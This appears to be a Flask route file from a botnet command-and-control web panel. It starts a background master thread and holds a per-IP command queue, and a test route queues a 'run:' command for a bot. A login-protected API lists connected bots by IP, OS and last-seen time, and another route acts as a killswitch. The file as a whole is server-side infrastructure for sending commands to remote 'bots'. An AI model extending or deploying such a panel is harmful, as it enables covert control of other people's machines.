from app import app, master, db
from flask import render_template, g, abort, request
from flask.ext.security import current_user, login_required
from threading import Thread
from app.models import Bot
import json

@app.before_first_request
def before_first():
    master_t = Thread(target=master.main)
    master_t.start()

@app.before_request
def before_request():
    if app.killswitch:
        abort(500)
    g.queue = master.queue
    g.user = current_user

@app.route('/')
@app.route('/home')
@app.route('/index')
def index():
    return render_template("index.html", title="Home")

@app.route('/kill')
@login_required
def kill():
    app.killswitch = 1
    abort(500)

@app.route('/testcmd')
@login_required
def testcmd():
    g.queue['127.0.0.1'].append("run:okay dad")
    b = Bot.query.filter_by(ip="127.0.0.1").one()
    return str(b.last_seen)

@app.route("/api/clients/list", methods=["GET"])
@login_required
def api_clients():
    bots = [ Bot.query.filter_by(ip=c).one() for c in g.queue.keys() ]
    data = {}
    for bot in bots:
        data[bot.id] = dict()
        data[bot.id]["IP"] = bot.ip
        data[bot.id]["OS"] = bot.os
        data[bot.id]["last_seen"] = bot.last_seen
    return json.dumps(data)

@app.route("/bots")
@login_required
def bots():
    return render_template("bots.html", title="Bots")
